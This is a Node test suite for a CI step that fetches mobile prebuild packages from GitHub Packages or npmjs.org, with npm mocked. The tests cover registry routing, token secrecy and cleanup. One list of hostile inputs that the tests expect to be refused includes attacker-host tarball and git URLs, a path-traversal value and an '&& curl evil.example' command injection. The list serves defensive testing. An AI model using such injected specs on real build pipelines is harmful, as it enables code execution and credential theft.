// Guards the prebuild-resolution step of
// .github/actions/run-mobile-integration-tests/setup/action.yml.
//
// That step is the ONLY way an unmerged native change reaches a Device Farm
// device: a standalone workflow_dispatch builds no prebuild artifacts, so the
// dispatch `package` / `package_spec` input has to install a branch build from
// GitHub Packages. It used to run a bare `npm pack`, which always resolved
// registry.npmjs.org and therefore 404'd on every @tetherto/* spec while the
// inputs advertised exactly that form. These tests pin the routing so the
// capability cannot silently rot again.
//
// npm is mocked (fixtures/mobile-prebuilds/mock-npm), so nothing here needs a
// network or credentials.
import test from 'node:test'
import assert from 'node:assert/strict'
import { spawnSync } from 'node:child_process'
import {
  chmodSync,
  copyFileSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'

const root = resolve(dirname(fileURLToPath(import.meta.url)), '../../..')
const ACTION = '.github/actions/run-mobile-integration-tests/setup/action.yml'
const STEP = 'Download prebuilds (from npm — fallback when no artifacts found)'
const GPR_HOST = 'https://npm.pkg.github.com'
const NPM_HOST = 'https://registry.npmjs.org'

function read(relativePath) {
  return readFileSync(join(root, relativePath), 'utf8')
}

// Pulls the literal shell out of a `run: |` block so the test exercises the
// same text CI executes. Mirrors the helper in ci-trust-policy.test.mjs.
function extractRunBlock(relativePath, stepName) {
  const source = read(relativePath)
  const stepIndex = source.indexOf(`name: ${stepName}`)
  assert.notEqual(stepIndex, -1, `step "${stepName}" exists in ${relativePath}`)

  const remainder = source.slice(stepIndex)
  const runMatch = remainder.match(/^(\s*)run:\s*\|\s*$/m)
  assert.ok(runMatch, `run block exists after "${stepName}" in ${relativePath}`)

  const runStart = stepIndex + runMatch.index + runMatch[0].length + 1
  const contentIndent = runMatch[1].length + 2
  const lines = source.slice(runStart).split('\n')
  const block = []

  for (const line of lines) {
    if (line === '') {
      block.push('')
      continue
    }
    if (line.startsWith(' '.repeat(contentIndent))) {
      block.push(line.slice(contentIndent))
      continue
    }
    break
  }

  return block.join('\n')
}

const script = extractRunBlock(ACTION, STEP)

assert.ok(
  !script.includes('${{'),
  'the step body must stay free of GitHub expressions so it is testable as plain shell',
)

// Runs the step in a throwaway dir standing in for addon/<addon-workdir>.
function runStep({
  packageVersion = '',
  addonName = '@qvac/llm-llamacpp',
  force = 'false',
  token = 'ghs-test-token',
  seedPrebuilds = false,
  ancestorPackageJson = false,
  npmEnv = {},
} = {}) {
  const directory = mkdtempSync(join(tmpdir(), 'qvac-mobile-prebuilds-'))
  const workdir = join(directory, 'addon')
  const runnerTemp = join(directory, 'runner-temp')
  const mockBin = join(directory, 'bin')
  const npmLog = join(directory, 'npm-invocations.log')

  mkdirSync(workdir, { recursive: true })
  mkdirSync(runnerTemp, { recursive: true })
  mkdirSync(mockBin, { recursive: true })
  writeFileSync(npmLog, '')

  const mockNpm = join(mockBin, 'npm')
  copyFileSync(
    join(root, '.github/scripts/test/fixtures/mobile-prebuilds/mock-npm'),
    mockNpm,
  )
  chmodSync(mockNpm, 0o755)

  if (seedPrebuilds) {
    mkdirSync(join(workdir, 'prebuilds/android-arm64'), { recursive: true })
    writeFileSync(join(workdir, 'prebuilds/android-arm64/marker.txt'), 'from-artifact')
  }

  // Puts a package.json ABOVE $RUNNER_TEMP. That is enough to claim npm's
  // localPrefix and make it ignore an .npmrc written further down, which is the
  // shape of runner filesystem that broke @tetherto resolution.
  if (ancestorPackageJson) {
    writeFileSync(
      join(directory, 'package.json'),
      JSON.stringify({ name: 'ancestor', version: '1.0.0' }),
    )
  }

  const result = spawnSync(
    'bash',
    ['--noprofile', '--norc', '-e', '-o', 'pipefail', '-c', script],
    {
      cwd: workdir,
      encoding: 'utf8',
      env: {
        ...process.env,
        PATH: `${mockBin}:${process.env.PATH}`,
        RUNNER_TEMP: runnerTemp,
        ADDON_NPM_NAME: addonName,
        PACKAGE_VERSION: packageVersion,
        FORCE_NPM_PREBUILD: force,
        GPR_TOKEN: token,
        MOCK_NPM_LOG: npmLog,
        ...npmEnv,
      },
    },
  )

  const invocations = readFileSync(npmLog, 'utf8')
  const packDir = join(runnerTemp, 'gpr-prebuild-pack')

  const state = {
    status: result.status,
    output: `${result.stdout}${result.stderr}`,
    invocations,
    packDirExists: existsSync(packDir),
    prebuildsExist: existsSync(join(workdir, 'prebuilds')),
    workdirNpmrcExists: existsSync(join(workdir, '.npmrc')),
    prebuildMarkerSurvived: existsSync(
      join(workdir, 'prebuilds/android-arm64/marker.txt'),
    ),
    androidPrebuildInstalled: existsSync(
      join(workdir, 'prebuilds/android-arm64/addon.bare'),
    ),
    // Sampled by mock-npm while the file still exists — the step deletes it.
    npmrcMode: (invocations.match(/^npmrc_mode=(.+)$/m) || [])[1],
  }

  rmSync(directory, { recursive: true, force: true })
  return state
}

test('a @tetherto spec is resolved from GitHub Packages, with auth', () => {
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp-mono@0.47.0-tmp.runid-1',
    force: 'true',
  })

  assert.equal(run.status, 0, run.output)
  assert.ok(
    run.invocations.includes(`registry=${GPR_HOST}`),
    `npm should have resolved ${GPR_HOST}, got:\n${run.invocations}`,
  )
  assert.match(run.invocations, /auth=token/)
  assert.match(run.output, /GitHub Packages/)
  assert.ok(run.androidPrebuildInstalled, 'android prebuild landed in prebuilds/')
})

// npm resolves project config at its localPrefix (nearest ancestor owning a
// package.json / node_modules), NOT at cwd. If the pack dir does not own
// localPrefix, the .npmrc is ignored, @tetherto routes back to
// registry.npmjs.org, and the run 404s while still logging "GitHub Packages".
test('GPR routing survives a package.json above $RUNNER_TEMP', () => {
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp-mono@0.47.0-tmp.runid-1',
    force: 'true',
    ancestorPackageJson: true,
  })

  assert.equal(run.status, 0, run.output)
  assert.ok(
    run.invocations.includes(`registry=${GPR_HOST}`),
    `an ancestor package.json must not divert resolution:\n${run.invocations}`,
  )
  assert.match(run.invocations, /auth=token/)
  // The pack dir must be the one that owns localPrefix.
  assert.match(run.invocations, /local_prefix=(.*)gpr-prebuild-pack/)
})

test('a @qvac spec still goes to npmjs.org and never to GitHub Packages', () => {
  const run = runStep({
    packageVersion: '@qvac/llm-llamacpp@0.46.0',
    force: 'true',
  })

  assert.equal(run.status, 0, run.output)
  assert.ok(
    run.invocations.includes(`registry=${NPM_HOST}`),
    `npm should have resolved ${NPM_HOST}, got:\n${run.invocations}`,
  )
  assert.match(run.invocations, /npmrc_present=no/)
  assert.doesNotMatch(run.invocations, /npm\.pkg\.github\.com/)
})

test('an empty package-version still resolves <addon>@latest from npmjs.org', () => {
  const run = runStep({ addonName: '@qvac/llm-llamacpp' })

  assert.equal(run.status, 0, run.output)
  assert.match(run.invocations, /spec=@qvac\/llm-llamacpp@latest/)
  assert.ok(
    run.invocations.includes(`registry=${NPM_HOST}`),
    `npm should have resolved ${NPM_HOST}, got:\n${run.invocations}`,
  )
})

test('a @tetherto spec without a token fails before contacting any registry', () => {
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp-mono@0.47.0-tmp.runid-1',
    force: 'true',
    token: '',
  })

  assert.notEqual(run.status, 0)
  assert.match(run.output, /no token was supplied/)
  assert.match(run.output, /packages: read/)
  assert.equal(run.invocations, '', 'npm must not be invoked without a token')
})

test('a @tetherto spec missing the -mono suffix is called out', () => {
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp@0.47.0-tmp.runid-1',
    force: 'true',
  })

  // The suffix is a warning, not a hard failure: a handful of un-suffixed
  // packages still exist, they are just abandoned.
  assert.match(run.output, /::warning::/)
  assert.match(run.output, /-mono/)
})

test('a versionless @tetherto spec keeps its package name intact', () => {
  // "@tetherto/foo-mono" has no version, so stripping at the last '@' would
  // yield "" — a bogus "has no '-mono' suffix" warning and truncated hints.
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp-mono',
    force: 'true',
  })

  assert.equal(run.status, 0, run.output)
  assert.match(run.invocations, /spec=@tetherto\/llm-llamacpp-mono$/m)
  assert.doesNotMatch(
    run.output,
    /::warning::/,
    'a name that already ends in -mono must not be warned about',
  )
})

test('a versionless @tetherto spec without -mono still names itself in the hint', () => {
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp',
    force: 'true',
    npmEnv: { MOCK_NPM_FAIL_WITH: '404' },
  })

  assert.notEqual(run.status, 0)
  assert.match(run.output, /@tetherto\/llm-llamacpp has no '-mono' suffix/)
  assert.match(run.output, /q=@tetherto\/llm-llamacpp$/m)
})

test('the .npmrc holding the token is not world-readable', () => {
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp-mono@0.47.0-tmp.runid-1',
    force: 'true',
  })

  assert.equal(run.status, 0, run.output)
  assert.equal(
    run.npmrcMode,
    '600',
    `the token-bearing .npmrc must be 0600, got ${run.npmrcMode}`,
  )
})

// The step holds a GPR credential and several workflows forward a
// workflow_dispatch value straight into package-version. `npm pack` accepts
// non-registry specs (file:, git:, https:, github:, npm: aliases) and a git spec
// would RUN prepare scripts from an arbitrary source. The workflow-level gate is
// prefix-only, so every one of these satisfies it — the action must fail closed.
const HOSTILE_SPECS = [
  '@qvac/llm-llamacpp@file:/tmp/evil.tgz',
  '@tetherto/x-mono@https://evil.example/payload.tgz',
  '@qvac/a@git+ssh://git@evil.example/x.git',
  '@tetherto/a-mono@github:attacker/repo',
  '@qvac/a@npm:other-package@1.0.0',
  '@evil/pkg@1.0.0',
  '@qvac/a@1.0.0 && curl evil.example',
  '../../etc/passwd',
]

for (const spec of HOSTILE_SPECS) {
  test(`rejects a non-registry spec before invoking npm: ${spec}`, () => {
    const run = runStep({ packageVersion: spec, force: 'true' })

    assert.notEqual(run.status, 0, `must fail closed on ${spec}`)
    assert.match(run.output, /Refusing to npm pack/)
    assert.equal(
      run.invocations,
      '',
      `npm must never be invoked for ${spec}`,
    )
    // No .npmrc, so the credential is never written for a rejected spec.
    assert.equal(run.packDirExists, false)
  })
}

// Every shape a real caller actually produces must still pass.
const LEGITIMATE_SPECS = [
  '@qvac/llm-llamacpp@0.46.0',
  '@tetherto/llm-llamacpp-mono@0.47.0-tmp.runid-33179656677',
  '@tetherto/llm-llamacpp-mono@0.47.0-tmp.pr-3938.runid-33179656677',
  '@qvac/llm-llamacpp@latest',
  '@qvac/transcription-parakeet@1.0.0',
]

for (const spec of LEGITIMATE_SPECS) {
  test(`accepts the real caller spec: ${spec}`, () => {
    const run = runStep({ packageVersion: spec, force: 'true' })
    assert.equal(run.status, 0, run.output)
    assert.doesNotMatch(run.output, /Refusing to npm pack/)
  })
}

test('accepts a bare dist-tag and an unscoped addon name', () => {
  // inference-addon-cpp passes an UNSCOPED addon-npm-name and no package input,
  // so its fallback spec is "inference-addon-cpp-mobile-tests@latest".
  const unscoped = runStep({ addonName: 'inference-addon-cpp-mobile-tests' })
  assert.equal(unscoped.status, 0, unscoped.output)
  assert.match(unscoped.invocations, /spec=inference-addon-cpp-mobile-tests@latest/)

  // Whisper/TTS-style callers wire a bare version through package-version.
  const bare = runStep({ packageVersion: '1.4.0', force: 'true', npmEnv: { MOCK_NPM_VERSION: '1.4.0' } })
  assert.equal(bare.status, 0, bare.output)
  assert.match(bare.invocations, /spec=@qvac\/llm-llamacpp@1\.4\.0/)
})

test('a failed @tetherto resolve points at GitHub Packages, not npmjs.com', () => {
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp-mono@0.0.0-nope',
    force: 'true',
    npmEnv: { MOCK_NPM_FAIL_WITH: '404' },
  })

  assert.notEqual(run.status, 0)
  assert.match(run.output, /github\.com\/orgs\/tetherto\/packages/)
  assert.match(run.output, /tmp\.runid-/)
  assert.doesNotMatch(
    run.output,
    /www\.npmjs\.com/,
    'a GPR failure must not send the reader to npmjs.com',
  )
})

test('the token never lands in the addon checkout that gets bundled', () => {
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp-mono@0.47.0-tmp.runid-1',
    force: 'true',
    token: 'ghs-secret-value',
  })

  assert.equal(run.status, 0, run.output)
  assert.equal(run.workdirNpmrcExists, false, 'no .npmrc left in the addon workdir')
  assert.equal(run.packDirExists, false, 'the pack dir (holding the .npmrc) is removed')
  assert.doesNotMatch(run.output, /ghs-secret-value/)
})

test('the pack dir is cleaned up even when the download fails', () => {
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp-mono@0.0.0-nope',
    force: 'true',
    npmEnv: { MOCK_NPM_FAIL_WITH: '404' },
  })

  assert.notEqual(run.status, 0)
  assert.equal(run.packDirExists, false)
})

test('artifact-first precedence is unchanged: artifacts win, npm is skipped', () => {
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp-mono@0.47.0-tmp.runid-1',
    force: 'false',
    seedPrebuilds: true,
  })

  assert.equal(run.status, 0, run.output)
  assert.match(run.output, /skipping npm fallback/)
  assert.equal(run.invocations, '', 'npm must not run when artifacts are present')
  assert.ok(run.prebuildMarkerSurvived, 'the artifact prebuild is left in place')
})

test('force-npm-prebuild discards artifacts so a pin cannot be shadowed', () => {
  // QVAC-21879: a benchmark baseline session once measured the candidate binary
  // because an artifact shadowed the pinned version.
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp-mono@0.47.0-tmp.runid-1',
    force: 'true',
    seedPrebuilds: true,
  })

  assert.equal(run.status, 0, run.output)
  assert.match(run.output, /discarding pre-existing prebuilds/)
  assert.equal(run.prebuildMarkerSurvived, false, 'the shadowing artifact is gone')
  assert.ok(run.androidPrebuildInstalled, 'the pinned package supplied the prebuild')
})

test('provenance mismatch fails instead of testing the wrong binary', () => {
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp-mono@0.47.0-tmp.runid-1',
    force: 'true',
    npmEnv: { MOCK_NPM_VERSION: '0.1.0' },
  })

  assert.notEqual(run.status, 0)
  assert.match(run.output, /but package-version pins/)
})

test('a package without prebuilds/ is rejected', () => {
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp-mono@0.47.0-tmp.runid-1',
    force: 'true',
    npmEnv: { MOCK_NPM_NO_PREBUILDS: '1' },
  })

  assert.notEqual(run.status, 0)
  assert.match(run.output, /No prebuilds directory found/)
})

// The dispatch inputs are what people copy from. They advertise the @tetherto
// form, so the advertised name must be the one publish-library-to-gpr actually
// publishes (`name-suffix: "-mono"`).
test('every mobile dispatch input advertises the -mono GPR name', () => {
  const workflows = spawnSync(
    'git',
    ['ls-files', '.github/workflows/integration-mobile-test-*.yml'],
    { cwd: root, encoding: 'utf8' },
  )
    .stdout.trim()
    .split('\n')
    .filter(Boolean)

  assert.ok(workflows.length >= 13, `found ${workflows.length} mobile workflows`)

  const offenders = []
  for (const relativePath of workflows) {
    // Any @tetherto/<name>@ spec whose name lacks the -mono suffix.
    for (const match of read(relativePath).matchAll(/@tetherto\/[a-z0-9-]+?(?<!-mono)@/g)) {
      offenders.push(`${relativePath}: ${match[0]}`)
    }
  }

  assert.deepEqual(
    offenders,
    [],
    `GPR dev builds are published as @tetherto/<addon>-mono:\n${offenders.join('\n')}`,
  )
})
